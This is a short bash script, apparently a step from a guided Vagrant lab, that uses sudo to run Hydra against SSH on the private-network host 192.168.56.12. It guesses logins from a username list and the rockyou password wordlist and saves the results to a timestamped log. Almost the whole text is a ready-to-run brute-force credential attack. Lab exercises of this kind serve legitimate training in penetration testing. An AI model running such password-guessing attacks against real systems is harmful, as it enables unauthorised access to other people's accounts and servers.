sudo bash -se <<'__EOF__'
set -Eeuo pipefail
TS=$(date +%Y%m%d_%H%M%S)
mkdir -p "/home/vagrant/data/hydra"
echo "[hydra] alvo=192.168.56.12 servico=ssh users=/home/vagrant/data/hydra/users.clean.txt pass=/home/vagrant/data/hydra/rockyou.clean.txt t=2"
hydra -I -V -t 2 \
  -L "/home/vagrant/data/hydra/users.clean.txt" \
  -P "/home/vagrant/data/hydra/rockyou.clean.txt" \
  -o "/home/vagrant/data/hydra/hydra_${TS}.log" \
  192.168.56.12 ssh || true
echo "$TS" > "/home/vagrant/data/hydra/.last_ts"
echo "[guide] step_done_$$"

echo "[guide] step_done_$$"

__EOF__